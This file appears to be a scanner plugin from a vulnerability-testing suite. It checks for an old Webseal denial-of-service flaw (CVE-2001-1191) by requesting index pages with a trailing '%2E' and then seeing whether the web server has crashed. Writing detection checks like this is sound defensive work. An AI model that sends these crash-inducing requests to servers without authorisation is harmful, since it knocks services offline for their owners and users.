if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11089" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 3685 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2001-1191" );
	script_name( "Webseal denial of service" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2002 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc", "httpver.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade your server or firewall it." );
	script_tag( name: "summary", value: "The remote web server dies when an URL ending with %2E is requested." );
	script_tag( name: "impact", value: "An attacker may use this flaw to make your server crash continually." );
	script_tag( name: "affected", value: "Webseal version 3.8. Other versions or products might be affected as well." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_asp( port: port )){
	exit( 0 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
for url in make_list( "/index.html",
	 "/index.htm",
	 "/index.asp",
	 "/" ) {
	req = http_get( port: port, item: NASLString( url, "%2E" ) );
	send( socket: soc, data: req );
	r = http_recv( socket: soc );
	http_close_socket( soc );
	soc = http_open_socket( port );
	if(!soc){
		break;
	}
}
if(soc){
	http_close_socket( soc );
}
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

